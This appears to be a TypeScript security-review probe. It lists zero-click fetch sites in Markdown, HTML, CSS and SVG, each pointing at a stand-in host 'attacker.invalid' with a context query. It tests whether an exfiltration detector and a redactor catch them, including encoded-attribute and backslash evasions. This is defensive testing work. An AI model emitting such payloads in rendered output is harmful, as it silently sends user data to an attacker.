// T66 — independent re-derivation of the zero-click fetch surface, plus the
// gate/spelling probes T46 did not run.
//
// Method (stated in the review): the site list below was written from the HTML
// element index (§4.2–§4.12, §16), the CSS <url> consumers, and the SVG external
// reference elements, WITHOUT reading T46's table first; T46's dispositions were
// then attached as `t46` to every row so the two lists can be diffed
// mechanically. Rows marked `extra: true` are sites I derived that neither
// enumeration (T40/T42/T52, nor T46) lists.
//
// Three independent questions per row, as T53/T46 did:
//   1. tokenizer oracle  — Bun's HTMLRewriter (lol-html) attributes the
//      URL-bearing attribute to the element (HTML rows only).
//   2. detector          — detectExfil(content, []) flags / partial / released.
//   3. mask              — applyRedaction removes the host from the text.
//
// Read-only. Synthetic/reserved hosts only; nothing is contacted.
// Usage: bun T66-enum.ts [out.json]
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const BS = String.fromCharCode(92);

type Row = {
  id: string;
  // what a renderer does with it, from the standard
  cls: "SUB" | "NAV" | "DOC" | "NONE";
  text: string;
  // the tokenizer question, when it is an HTML attribute site
  oracle?: { tag: string; attr: string };
  // T46's disposition for this site
  t46: "covered" | "deferred" | "never" | "not-a-site" | "absent-from-T46";
  extra?: boolean;
  note?: string;
};

const rows: Row[] = [
  // ---- already covered before T46 (the baseline) ----------------------------
  { id: "B1.mdImage", cls: "SUB", text: `![a](${U})`, t46: "covered" },
  { id: "B2.mdRefDef", cls: "SUB", text: `![a][r]\n\n[r]: ${U}\n`, t46: "covered" },
  { id: "B3.imgSrc", cls: "SUB", text: `<img src="${U}">`, oracle: { tag: "img", attr: "src" }, t46: "covered" },
  { id: "B4.imgSrcset", cls: "SUB", text: `<img srcset="${U} 2x">`, oracle: { tag: "img", attr: "srcset" }, t46: "covered" },
  { id: "B5.baseHref", cls: "DOC", text: `<base href="${U}">`, oracle: { tag: "base", attr: "href" }, t46: "covered" },

  // ---- HTML sites T46 says it covers now -----------------------------------
  { id: "U01.inputImageSrc", cls: "SUB", text: `<input type="image" src="${U}">`, oracle: { tag: "input", attr: "src" }, t46: "covered" },
  { id: "U02.metaRefresh", cls: "NAV", text: `<meta http-equiv="refresh" content="0;url=${U}">`, oracle: { tag: "meta", attr: "content" }, t46: "covered" },
  { id: "U03.videoPoster", cls: "SUB", text: `<video poster="${U}"></video>`, oracle: { tag: "video", attr: "poster" }, t46: "covered" },
  { id: "U04.videoSrc", cls: "SUB", text: `<video src="${U}"></video>`, oracle: { tag: "video", attr: "src" }, t46: "covered" },
  { id: "U05.audioSrc", cls: "SUB", text: `<audio src="${U}"></audio>`, oracle: { tag: "audio", attr: "src" }, t46: "covered" },
  { id: "U06.sourceSrc", cls: "SUB", text: `<video><source src="${U}"></video>`, oracle: { tag: "source", attr: "src" }, t46: "covered" },
  { id: "U07.sourceSrcset", cls: "SUB", text: `<picture><source srcset="${U} 2x"></picture>`, oracle: { tag: "source", attr: "srcset" }, t46: "covered" },
  { id: "U08.trackSrc", cls: "SUB", text: `<video><track default src="${U}"></video>`, oracle: { tag: "track", attr: "src" }, t46: "covered" },
  { id: "U09.embedSrc", cls: "SUB", text: `<embed src="${U}">`, oracle: { tag: "embed", attr: "src" }, t46: "covered" },
  { id: "U10.objectData", cls: "SUB", text: `<object data="${U}"></object>`, oracle: { tag: "object", attr: "data" }, t46: "covered" },
  { id: "U11.iframeSrc", cls: "SUB", text: `<iframe src="${U}"></iframe>`, oracle: { tag: "iframe", attr: "src" }, t46: "covered" },
  { id: "U16a.bodyBackground", cls: "SUB", text: `<body background="${U}">`, oracle: { tag: "body", attr: "background" }, t46: "covered" },
  { id: "U16b.tableBackground", cls: "SUB", text: `<table background="${U}"><tr><td>x</td></tr></table>`, oracle: { tag: "table", attr: "background" }, t46: "covered" },
  { id: "U16c.tdBackground", cls: "SUB", text: `<table><tr><td background="${U}">x</td></tr></table>`, oracle: { tag: "td", attr: "background" }, t46: "covered" },
  { id: "U16d.thBackground", cls: "SUB", text: `<table><tr><th background="${U}">x</th></tr></table>`, oracle: { tag: "th", attr: "background" }, t46: "covered" },
  { id: "U16e.trBackground", cls: "SUB", text: `<table><tr background="${U}"><td>x</td></tr></table>`, oracle: { tag: "tr", attr: "background" }, t46: "covered" },
  { id: "U16f.tbodyBackground", cls: "SUB", text: `<table><tbody background="${U}"><tr><td>x</td></tr></tbody></table>`, oracle: { tag: "tbody", attr: "background" }, t46: "covered" },
  { id: "U16g.theadBackground", cls: "SUB", text: `<table><thead background="${U}"><tr><th>x</th></tr></thead></table>`, oracle: { tag: "thead", attr: "background" }, t46: "covered" },
  { id: "U16h.tfootBackground", cls: "SUB", text: `<table><tfoot background="${U}"><tr><td>x</td></tr></tfoot></table>`, oracle: { tag: "tfoot", attr: "background" }, t46: "covered" },
  { id: "U23a.svgImageHref", cls: "SUB", text: `<svg><image href="${U}"/></svg>`, oracle: { tag: "image", attr: "href" }, t46: "covered" },
  { id: "U23b.svgImageXlink", cls: "SUB", text: `<svg><image xlink:href="${U}"/></svg>`, oracle: { tag: "image", attr: "xlink:href" }, t46: "covered" },
  { id: "U24a.feImageHref", cls: "SUB", text: `<svg><filter><feImage href="${U}"/></filter></svg>`, oracle: { tag: "feimage", attr: "href" }, t46: "covered" },
  { id: "U24b.feImageXlink", cls: "SUB", text: `<svg><filter><feImage xlink:href="${U}"/></filter></svg>`, oracle: { tag: "feimage", attr: "xlink:href" }, t46: "covered" },

  // ---- HTML/CSS/SVG sites T46 defers ---------------------------------------
  { id: "U12.iframeSrcdoc", cls: "SUB", text: `<iframe srcdoc="&lt;img src=${U}&gt;"></iframe>`, oracle: { tag: "iframe", attr: "srcdoc" }, t46: "deferred" },
  { id: "U13.scriptSrc", cls: "SUB", text: `<script src="${U}"></script>`, oracle: { tag: "script", attr: "src" }, t46: "deferred" },
  { id: "U14a.linkStylesheet", cls: "SUB", text: `<link rel="stylesheet" href="${U}">`, oracle: { tag: "link", attr: "href" }, t46: "deferred" },
  { id: "U14b.linkPreload", cls: "SUB", text: `<link rel="preload" as="image" href="${U}">`, oracle: { tag: "link", attr: "href" }, t46: "deferred" },
  { id: "U14c.linkIcon", cls: "SUB", text: `<link rel="icon" href="${U}">`, oracle: { tag: "link", attr: "href" }, t46: "deferred" },
  { id: "U15.linkImagesrcset", cls: "SUB", text: `<link rel="preload" as="image" imagesrcset="${U} 2x">`, oracle: { tag: "link", attr: "imagesrcset" }, t46: "deferred" },
  { id: "U18.styleAttrUrl", cls: "SUB", text: `<div style="background-image:url(${U})">x</div>`, oracle: { tag: "div", attr: "style" }, t46: "deferred" },
  { id: "U19.styleBlockUrl", cls: "SUB", text: `<style>.a{background:url(${U})}</style>`, t46: "deferred" },
  { id: "U20a.importUrl", cls: "SUB", text: `<style>@import url(${U});</style>`, t46: "deferred" },
  { id: "U20b.importBareString", cls: "SUB", text: `<style>@import "${U}";</style>`, t46: "deferred" },
  { id: "U21.fontFaceSrc", cls: "SUB", text: `<style>@font-face{font-family:x;src:url(${U})}</style>`, t46: "deferred" },
  { id: "U22.imageSet", cls: "SUB", text: `<div style="background:image-set('${U}' 1x)">x</div>`, t46: "deferred" },
  { id: "U25.svgScriptHref", cls: "SUB", text: `<svg><script href="${U}"></script></svg>`, oracle: { tag: "script", attr: "href" }, t46: "deferred" },

  // ---- never-cover / not-a-site --------------------------------------------
  { id: "U17.frameSrc", cls: "SUB", text: `<frameset><frame src="${U}"></frameset>`, oracle: { tag: "frame", attr: "src" }, t46: "never" },
  { id: "U26.svgUseHref", cls: "NONE", text: `<svg><use href="${U}#i"/></svg>`, oracle: { tag: "use", attr: "href" }, t46: "never" },
  { id: "X01.anchorHref", cls: "NONE", text: `<a href="${U}">x</a>`, t46: "never" },
  { id: "X02.formAction", cls: "NONE", text: `<form action="${U}"><button>go</button></form>`, t46: "never" },
  { id: "X03.textInputSrc", cls: "NONE", text: `<input type="text" src="${U}">`, t46: "never" },
  { id: "X04.templateImg", cls: "NONE", text: `<template><img src="${U}"></template>`, t46: "never" },
  { id: "X05.plainMeta", cls: "NONE", text: `<meta name="description" content="0;url=${U}">`, t46: "never" },

  // ---- sites I derived that are ABSENT from both enumerations ---------------
  {
    id: "E01.mdCollapsedRefImage",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `![a][]\n\n[a]: ${U}\n`,
    note: "CommonMark collapsed reference image — auto-fetched exactly like ![a][a]",
  },
  {
    id: "E02.mdShortcutRefImage",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `![a]\n\n[a]: ${U}\n`,
    note: "CommonMark shortcut reference image — auto-fetched",
  },
  {
    id: "E03.mdNestedBracketAlt",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `![a[b]c](${U})`,
    note: "CommonMark allows balanced brackets in the image description",
  },
  {
    id: "E04.metaRefreshCharrefGate",
    cls: "NAV",
    extra: true,
    t46: "absent-from-T46",
    text: `<meta http-equiv="&#114;efresh" content="0;url=${U}">`,
    oracle: { tag: "meta", attr: "http-equiv" },
    note: "the tokenizer decodes attribute VALUES, so this http-equiv IS refresh",
  },
  {
    id: "E05.inputTypeCharrefGate",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `<input type="&#105;mage" src="${U}">`,
    oracle: { tag: "input", attr: "type" },
    note: "the tokenizer decodes attribute VALUES, so this type IS image",
  },
  {
    id: "E06.inputTypeNamedRefGate",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `<input type="imag&#101;" src="${U}">`,
    oracle: { tag: "input", attr: "type" },
  },
  {
    id: "E07.metaRefreshUnquotedGate",
    cls: "NAV",
    extra: true,
    t46: "absent-from-T46",
    text: `<meta http-equiv=refresh content=${U}>`,
    note: "unquoted content, keyword-less destination",
  },
  {
    id: "E08.svgImageBackslashHref",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `<svg><image href="${BS}${BS}${ATT}/p"/></svg>`,
    note: "backslash authority spelling on a newly covered element",
  },
  {
    id: "E09.objectCodebase",
    cls: "NONE",
    extra: true,
    t46: "absent-from-T46",
    text: `<object codebase="${U}"></object>`,
    note: "obsolete; no shipping engine fetches it — expected released",
  },
  {
    id: "E10.videoSourceSrcsetMedia",
    cls: "SUB",
    extra: true,
    t46: "absent-from-T46",
    text: `<video><source src="${U}" type="video/mp4"></video>`,
  },
];

async function tokenizerOracle(text: string, tag: string, attr: string): Promise<string | null> {
  let seen: string | null = null;
  const rewriter = new HTMLRewriter().on("*", {
    element(el) {
      if (el.tagName.toLowerCase() !== tag) return;
      const value = el.getAttribute(attr);
      if (value !== null) seen = value;
    },
  });
  await rewriter.transform(new Response(text)).text();
  return seen;
}

type Out = {
  id: string;
  cls: string;
  t46: string;
  extra: boolean;
  oracleSeesDestination: boolean | "n/a";
  findings: number;
  policyIds: string[];
  verdict: "flagged" | "partial" | "released";
  maskedText: string;
  note?: string;
};

const out: Out[] = [];
for (const row of rows) {
  const findings = detectExfil(row.text, []);
  const redacted = applyRedaction(row.text, findings) as unknown;
  const masked =
    typeof redacted === "string"
      ? redacted
      : ((redacted as { text?: string }).text ?? String(redacted));
  const verdict: Out["verdict"] =
    findings.length === 0 ? "released" : masked.includes(ATT) ? "partial" : "flagged";
  out.push({
    id: row.id,
    cls: row.cls,
    t46: row.t46,
    extra: row.extra === true,
    oracleSeesDestination: row.oracle
      ? (await tokenizerOracle(row.text, row.oracle.tag, row.oracle.attr)) !== null
      : "n/a",
    findings: findings.length,
    policyIds: [...new Set(findings.map((f) => f.policyId))],
    verdict,
    maskedText: masked,
    note: row.note,
  });
}

for (const r of out) {
  console.log(
    `${r.id.padEnd(28)} cls=${r.cls.padEnd(4)} t46=${r.t46.padEnd(16)} oracle=${String(r.oracleSeesDestination).padEnd(5)} verdict=${r.verdict.padEnd(8)} n=${r.findings} ids=${JSON.stringify(r.policyIds)}`,
  );
}

const fetching = out.filter((r) => r.cls === "SUB" || r.cls === "NAV" || r.cls === "DOC");
const summary = {
  rows: out.length,
  fetchingRows: fetching.length,
  releasedFetching: fetching.filter((r) => r.verdict === "released").map((r) => r.id),
  releasedFetchingCount: fetching.filter((r) => r.verdict === "released").length,
  partial: out.filter((r) => r.verdict === "partial").map((r) => r.id),
  nonFetchingFlagged: out.filter((r) => r.cls === "NONE" && r.verdict !== "released").map((r) => r.id),
  // the rows T46 says are covered but that this probe finds released
  coveredButReleased: out
    .filter((r) => r.t46 === "covered" && r.verdict !== "flagged")
    .map((r) => `${r.id}:${r.verdict}`),
  // the sites absent from T46's enumeration that DO reach a renderer unmasked
  extraSitesReleased: out
    .filter((r) => r.extra && r.cls !== "NONE" && r.verdict === "released")
    .map((r) => r.id),
  oracleDisagreements: out
    .filter((r) => r.oracleSeesDestination === false)
    .map((r) => r.id),
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows: out }, null, 2));
